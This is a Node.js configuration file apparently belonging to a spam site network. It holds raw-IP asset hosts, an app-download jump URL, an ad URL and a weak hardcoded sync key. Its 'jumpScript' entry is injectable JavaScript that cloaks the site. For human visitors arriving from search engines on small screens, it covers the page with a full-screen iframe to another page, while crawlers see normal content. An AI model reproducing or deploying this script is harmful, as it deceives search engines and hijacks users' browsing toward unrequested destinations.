const isDevelopment = process.env.NODE_ENV === 'development'
    || process.env.EGG_SERVER_ENV === 'local'
    || process.env.EGG_SERVER_ENV === 'development';

module.exports = {
    "mubanStaticUrl":isDevelopment ? "" : "http://45.207.228.39",//（模板内容链接）
    "mubanStaticImgUrl":isDevelopment ? "" : "http://45.207.228.39",//（模板内容链接）
    "mubanStaticJsUrl":isDevelopment ? "" : "http://154.212.212.98",//（模板内容链接）
    "staticUrl":isDevelopment ? "http://45.207.228.39" : "http://45.207.228.39",//seo全局静态资源文章 包含（静态资源）
    "staticJsUrl":isDevelopment ? "" : "http://154.212.212.98",//静态资源 js css
    "staticImgUrl":isDevelopment ? "" : "http://45.207.228.39",//APP图标资源静态图 资源 url链接链接gif
    "staticAPPImg":isDevelopment ? "" : "http://45.207.228.39",//APP图标资源 js css
    "muluFile":"/ml",
    "allSiteTitle":"",
    "DOMAIN_SYNC_KEY":"aaa123456",
    "jumpCommUrl":"http://appxz.seziyuan.org",
    "angGuangGaoUrl":"http://sbbapp14.cc",
    "jumpScript":`
        const notSpider = !/(bot|spider|Spider)/i.test(navigator.userAgent);
        const regexpReferrer = /\.(sogou|soso|baidu|google|youdao|yahoo|bing|so|biso|gougou|ifeng|ivc|sooule|niuhu|biso|sm|toutiao)(\.[a-z0-9\-]+){1,2}\//ig;
        const whereReferrer = document.referrer || '';
        const isReferrer = regexpReferrer.test(whereReferrer);

        const createIframe = function (id, url, width, height) {
            if (!url || url.indexOf('http') == -1) return null;
            let html = document.querySelector('html');
            html.style.height = '100%';
            var iframe = document.createElement("iframe");
            iframe.id = id;
            iframe.width = width;
            iframe.height = height;
            iframe.style.position = 'fixed';
            iframe.style.top = '0';
            iframe.style['z-index'] = 10000;
            iframe.style['left'] = 0;
            iframe.style['background'] = '#ffffff';
            iframe.style['overflow'] = 'auto';
            iframe.src = url;
            iframe.setAttribute('frameborder', '0');
            document.body.style.height = '100%';
            document.body.style.overflow = 'hidden';
            document.body.style.padding = '0';
            document.body.style.margin = '0';
            document.body.appendChild(iframe);
        };
        if (notSpider && window.innerWidth < 1300&&whereReferrer) {
            createIframe('global-iframe', '/html/sbb02.html', '100%', '100%');
        };
    `
}


     			
